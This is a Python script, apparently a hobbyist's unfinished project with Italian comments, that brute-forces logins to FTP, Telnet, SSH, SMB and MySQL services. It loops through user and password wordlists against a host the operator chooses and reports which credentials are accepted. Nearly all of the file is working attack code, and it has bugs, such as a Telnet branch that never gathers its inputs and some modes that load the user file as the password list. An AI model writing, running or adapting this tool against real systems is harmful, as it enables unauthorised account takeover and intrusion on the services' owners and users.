# Libaries
import sys
import time
from ftplib import FTP, error_perm
import socket
import re
import paramiko
from impacket.smbconnection import SMBConnection, SessionError
import ntstatus
import mysql.connector

# List and dictonaries
modes = {
    'a': 'ftp',
    'b': 'telnet',
    'c': 'ssh',
    'd': 'smb',
    'e': 'mysql'
}

methods = {
    '1': 'use the same user and a list of passwords',
    '2': 'use a list of users and the same password',
    '3': 'use lists for both user and password'
}

info = {}

# Ftp
def ftp():
    while True:
        for number, mode in methods.items():
            print(number + ' -> ' + mode)
        selected_mode = input(
            'Please select the ftp option from the previos ones by typing the correspondive number: '
            )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit
        elif selected_mode == '1':
            ftp_1_connect()
            return None
        elif selected_mode == '2':
            ftp_2_connect()
            return None
        elif selected_mode == '3':
            ftp_3_connect()
            return None
        else:
            print('Mode not found, please try again.')

def ftp_1_info():
    while True:
        info['host'] = input(
            'Enter the host: '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        info['user'] = input(
            'Enter the user: '
        )
        password_list_file = input(
            "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(password_list_file, 'r', encoding='utf-8') as file:
                password_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return password_list

def ftp_1_connect():
    password_list = ftp_1_info()
    ftp = FTP()
    ftp.connect(host=info['host'], port=info['port']) # DA METTERE UN BLOCCO TRY EXCEPT
    for password in password_list:
        try:
            ftp.login(user=info['user'], passwd=password)
        except error_perm:
            print(f'Login failed with user "{info['user']}" and password "{password}".')
        else:
            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
            break
    ftp.quit()

def ftp_2_info():
    while True:
        info['host'] = input(
            'Enter the host: '
            )
        info['port'] = int(input(
            'Enter the port: '
        ))
        user_list_file = input(
            "Please type the file's path containing the users' list: "
        )
        info['password'] = input(
            'Enter the password: '
        )
        try:
            with open(user_list_file, 'r', encoding='utf-8') as file:
                user_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return user_list
        
def ftp_2_connect():
    user_list = ftp_2_info()
    ftp = FTP()
    ftp.connect(host=info['host'], port=info['port'])
    for user in user_list:
        try:
            ftp.login(user=user, passwd=info['password'])
        except error_perm:
            print(f'Login failed with user "{user}" and password "{info['password']}".')
        else:
            print(f'Login GRANTED with user "{user}" and password "{info['password']}".')
            break
    ftp.quit()

def ftp_3_info():
    while True:
        info['host'] = input(
            'Enter the host:\t'
        )
        info['port'] = int(input(
            'Enter the port:\t'
        ))
        users_list_file = input(
            "Please type the file's path containing the users' list: "
        )
        password_list_file = input(
            "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(users_list_file, 'r', encoding='utf-8') as user_file:
                user_list = [line.strip() for line in user_file]
        except FileNotFoundError:
            print('This file (user_path) does not exist, please try again.')
        else:
            info['user_list'] = user_list
        try:
            with open(password_list_file, 'r', encoding='utf-8') as password_file:
                password_list = [line.strip() for line in password_file]
        except FileNotFoundError:
            print('This file (password_path) does not exist, please try again.')
        else:
            info['password_list'] = password_list
            return None

def ftp_3_connect():
    ftp_3_info()
    user_list = info['user_list']
    password_list = info['password_list']
    ftp = FTP()
    ftp.connect(host=info['host'], port=info['port'])
    for user in user_list:
        for password in password_list:
            try:
                ftp.login(user=user, passwd=password)
            except error_perm:
                print(f'Login failed with user "{user}" and password "{password}".')
            else:
                print(f'Login GRANTED with user "{user}" and password "{password}".')
                ftp.quit()
                sys.exit()

# Telnet
def telnet():
    while True:
        for number, mode in methods.items():
            print(number + ' -> ' + mode)
        selected_mode = input(
            'Please select the telnet option from the previos ones by typing the correspondive number: '
            )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit
        elif selected_mode == '1':
            telnet_1_connect()
            return None
        elif selected_mode == '2':
            telnet_2_connect()
            return None
        elif selected_mode == '3':
            telnet_3_connect()
            return None
        else:
            print('Mode not found, please try again.')

def telnet_1_info():
    while True:
        for number, mode in methods.items():
           print(number + ' -> ' + mode)
        selected_mode = input(
            'Please select the telnet option from the previos ones by typing the correspondive number: '
           )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit
        elif selected_mode == '1':
            telnet_1_connect()
            return None
        elif selected_mode == '2':
            telnet_2_connect()
            return None
        elif selected_mode == '3':
            telnet_3_connect()
            return None
        else:
            print('Mode not found, please try again.')

def clean_telnet(data: bytes) -> str:
    cleaned = re.sub(b'\xff[\xf0-\xff][\x00-\xff]|\xff\xfa.*?\xff\xf0', b'', data, flags=re.DOTALL)
    return cleaned.decode('utf-8', 'ignore').strip()

def telnet_1_connect():
    password_list = telnet_1_info()
    for password in password_list:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((info['host'], info['port']))
            
            # Attende e legge tutto il banner iniziale (che arriva subito)
            time.sleep(0.5)
            banner = clean_telnet(s.recv(4096))
            
            # Invia l'username
            s.sendall(f"{info['user']}\r\n".encode('utf-8'))
            time.sleep(0.3)
            s.recv(1024) # Legge la risposta intermedia (es. "Password:")
            
            # Invia la password
            s.sendall(f"{password}\r\n".encode('utf-8'))
            time.sleep(0.5)
            
            # Legge la risposta finale
            response = clean_telnet(s.recv(1024))
            s.close()
            
            # Verifica
            if "incorrect" in response.lower() or "failed" in response.lower():
                print(f"[-] Fallito: {password}")
            else:
                print(f"[+] SUCCESSO! Password: {password}")
                break
                
        except Exception as e:
            print(f"[!] Errore: {e}")
            try:
                s.close()
            except:
                pass

# Ssh
def ssh():
    while True:
        for number, mode in methods.items():
            print(number + ' -> ' + mode)
        selected_mode = input(
            'Please select the ssh option from the previos ones by typing the correspondive number: '
            )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit
        elif selected_mode == '1':
            ssh_1_connect()
            return None
        elif selected_mode == '2':
            ssh_2_connect()
            return None
        elif selected_mode == '3':
            ssh_3_connect()
            return None
        else:
            print('Mode not found, please try again.')

def ssh_1_info():
    while True:
        info['host'] = input(
            'Enter the host: '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        info['user'] = input(
            'Enter the user: '
        )
        password_list_file = input(
            "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(password_list_file, 'r', encoding='utf-8') as file:
                password_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return password_list
        
def ssh_1_connect():
    password_list = ssh_1_info()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(
                hostname=info['host'], port=info['port'], username=info['user'], password=password, disabled_algorithms=None, look_for_keys=False, allow_agent=False
                )
            time.sleep(0.5)
        except paramiko.AuthenticationException:
            print(f'Login failed with user "{info['user']}" and password "{password}".')
            ssh.close()
        else:
            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
            break
    ssh.close()
    # RIMA APERTO DOPO LA FINE RISOLVERE

def ssh_2_info():
    while True:
        info['host'] = input(
            'Enter the host: '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        user_list_file = input(
                "Please type the file's path containing the passwords' list: "
            )
        info['password'] = input(
            'Enter the password: '
        )
        try:
            with open(user_list_file, 'r', encoding='utf-8') as file:
                user_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return user_list

def ssh_2_connect():
    user_list = ssh_2_info()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in user_list:
        try:
            ssh.connect(
                hostname=info['host'], port=info['port'], username=user, password=info['password'], disabled_algorithms=None, look_for_keys=False, allow_agent=False
                )
            time.sleep(0.5)
        except paramiko.AuthenticationException:
            print(f'Login failed with user "{user}" and password "{info['password']}".')
            ssh.close()
        else:
            print(f'Login GRANTED with user "{user}" and password "{info['password']}".')
            break
    ssh.close()

def ssh_3_info():
    while True:
        info['host'] = input(
            'Enter the host: '
            )
        info['port'] = int(input(
            'Enter the port: '
            ))
        user_list_file = input(
            "Please type the file's path containing the users' list: "
            )
        password_list_file = input(
            "Please type the file's path containing the passwords' list: "
            )
        try:
            with open(user_list_file, 'r', encoding='utf-8') as user_file:
                user_list = [line.strip() for line in user_file]
        except FileNotFoundError:
            print('This file (user_path) does not exist, please try again.')
        else:
            info['user_list'] = user_list
        try:
            with open(password_list_file, 'r', encoding='utf-8') as password_file:
                password_list = [line.strip() for line in password_file]
        except FileNotFoundError:
                print('This file (password_path) does not exist, please try again.')
        else:
            info['password_list'] = password_list
            return None

def ssh_3_connect():
    ssh_3_info()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in info['user_list']:
        for password in info['password_list']:
            try:
                ssh.connect(hostname=info['host'], port=info['port'], username=user, password=password, disabled_algorithms=None, look_for_keys=False, allow_agent=False)
                time.sleep(0.5)
            except paramiko.AuthenticationException:
                print(f'Login failed with user "{user}" and password "{password}".')
                ssh.close()
            else:
                print(f'Login GRANTED with user "{user}" and password "{password}".')
                ssh.close()
                sys.exit()

# Smb
def smb():
    while True:
        for number, mode in methods.items():
            print(number + ' -> ' + mode)
        selected_mode = input(
            'Please select the smb option from the previos ones by typing the correspondive number: '
            )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit
        elif selected_mode == '1':
            smb_1_connect()
            return None
        elif selected_mode == '2':
            smb_2_connect()
            return None
        elif selected_mode == '3':
            smb_3_connect()
            return None
        else:
            print('Mode not found, please try again.')

def smb_1_info():
    while True:
        info['host'] = input(
            'Enter the host (use the IP): '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        info['user'] = input(
            'Enter the user: '
        )
        password_list_file = input(
            "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(password_list_file, 'r', encoding='utf-8') as file:
                password_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return password_list

def smb_1_connect():
    password_list = smb_1_info()
    target_host = str(info['host']).strip()
    target_port = int(info['port'])
    connection = SMBConnection(remoteHost=target_host, remoteName=target_host, sess_port=target_port)
    for password in password_list:
        try:
            connection.login(user=info['user'], password=password)
            time.sleep(0.5)
        except SessionError:
            print(f'Login failed with user "{info['user']}" and password "{password}".')
        else:
            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
            break
    connection.close()

def smb_2_info():
    while True:
        info['host'] = input(
            'Enter the host (use the IP): '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        users_list_file = input(
            "Please type the file's path containing the users' list: "
        )
        info['password'] = input(
            'Enter the password: '
        )
        try:
            with open(users_list_file, 'r', encoding='utf-8') as file:
                user_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return user_list

def smb_2_connect():
    user_list = smb_2_info()
    target_host = str(info['host']).strip()
    target_port = int(info['port'])
    connection = SMBConnection(remoteHost=target_host, remoteName=target_host, sess_port=target_port)
    for user in user_list:
        try:
            connection.login(user=user, password=info['password'])
        except SessionError:
            print(f'Login failed with user "{user}" and password "{info['password']}".')
        else:
            print(f'Login GRANTED with user "{user}" and password "{info['password']}".')
            break
    connection.close()

def smb_3_info():
    while True:
        info['host'] = input(
            'Enter the host (use the IP): '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        users_list_file = input(
            "Please type the file's path containing the users' list: "
        )
        passwords_list_file = input(
                "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(users_list_file, 'r', encoding='utf-8') as file:
                user_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            info['user_list'] = user_list
        try:
            with open(users_list_file, 'r', encoding='utf-8') as file:
                password_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            info['password_list'] = password_list
        return None

def smb_3_connect():
    smb_3_info()
    target_host = str(info['host']).strip()
    target_port = int(info['port'])
    connection = SMBConnection(remoteHost=target_host, remoteName=target_host, sess_port=target_port)
    for user in info['user_list']:
        for password in info['password_list']:
            try:
                connection.login(user=user, password=password)
            except SessionError:
                print(f'Login failed with user "{user}" and password "{password}".')            
            else:
                print(f'Login GRANTED with user "{user}" and password "{password}".')
                connection.close()
                sys.exit()
    

def mysql1():
     while True:
        for number, mode in methods.items():
            print(number + ' -> ' + mode)
        selected_mode = input(
            'Please select the mysql option from the previos ones by typing the correspondive number: '
            )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit
        elif selected_mode == '1':
            mysql_1_connect()
            return None
        elif selected_mode == '2':
            mysql_2_connect()
            return None
        elif selected_mode == '3':
            mysql_3_connect()
            return None
        else:
            print('Mode not found, please try again.')

def mysql_1_info():
    while True:
        info['host'] = input(
            'Enter the host: '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        info['user'] = input(
            'Enter the user: '
        )
        passwords_list_file = input(
            "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(passwords_list_file, 'r', encoding='utf-8') as file:
                password_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return password_list

def mysql_1_connect():
    password_list = mysql_1_info()
    for password in password_list:
        try:
            connection = mysql.connector.connect(
                host = info['host'],
                port = info['port'],
                user = info['user'],
                password = password
            )
        except mysql.connector.Error:
            print(f'Login failed with user "{info['user']}" and password "{password}".')
        else:
            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
            break
    connection.close()

def mysql_2_info():
    while True:
        info['host'] = input(
            'Enter the host: '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        users_list_file = input(
            "Please type the file's path containing the users' list: "
        )
        info['password'] = input(
            "Enter the password:  "
        )
        try:
            with open(users_list_file, 'r', encoding='utf-8') as file:
                user_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return user_list

def mysql_2_connect():
    user_list = mysql_2_info()
    for user in user_list:
        try:
            connection = mysql.connector.connect(
                host = info['host'],
                port = info['port'],
                user = user,
                password = info['password']
            )
        except mysql.connector.Error:
            print(f'Login failed with user "{user}" and password "{info['password']}".')
        else:
            print(f'Login GRANTED with user "{user}" and password "{info['password']}".')
            break
    connection.close()

def mysql_3_info():
    while True:
        info['host'] = input(
            'Enter the host: '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        users_list_file = input(
            "Please type the file's path containing the users' list: "
        )
        password_list_file = input(
                "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(users_list_file, 'r', encoding='utf-8') as file:
                user_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            info['user_list'] = user_list
        try:
            with open(users_list_file, 'r', encoding='utf-8') as file:
                password_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            info['password_list'] = password_list
            return None

def mysql_3_connect():
    mysql_3_info()
    for user in info['user_list']:
        for password in info['password_list']:
            try:
                connection = mysql.connector.connect(
                    host = info['host'],
                    port = info['port'],
                    user = user,
                    password = password
                )
            except mysql.connector.Error:
                print(f'Login failed with user "{user}" and password "{password}".')
            else:
                print(f'Login GRANTED with user "{user}" and password "{password}".')
                connection.close()
                sys.exit()





        





        
    


        
        
            


# Input mode
def input_mode():
    while True:
        print('Welcome...')
        for letter, mode in modes.items():
            print(letter + ' -> ' + mode)
        selected_mode = input(
            'Choose the protocol by typing the correspondive letter or type "q" to quit the program: '
        )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit()
        elif selected_mode == 'a':
            ftp()
            return None
        elif selected_mode == 'b':
            telnet()
            return None
        elif selected_mode == 'c':
            ssh()
            return None
        elif selected_mode == 'd':
            smb()
            return None
        elif selected_mode == 'e':
            mysql1()
            return None
        else:
            print('Mode not found, please try again.')

input_mode()

# BISOGNA METTERE UN IF Q DOVE CI SONO GLI INPUT IM MODO CHE SE VOLESSE USCIRE LO PUO FARE
# BISOGNA PENSARE AL DELAY TRA UN TENTATIVO E UN ALTRO PER EVITARE DANNI
# Mettere un opzione per lasciare la porta di default o user vuoto
# Mettere dei colori per denied e granted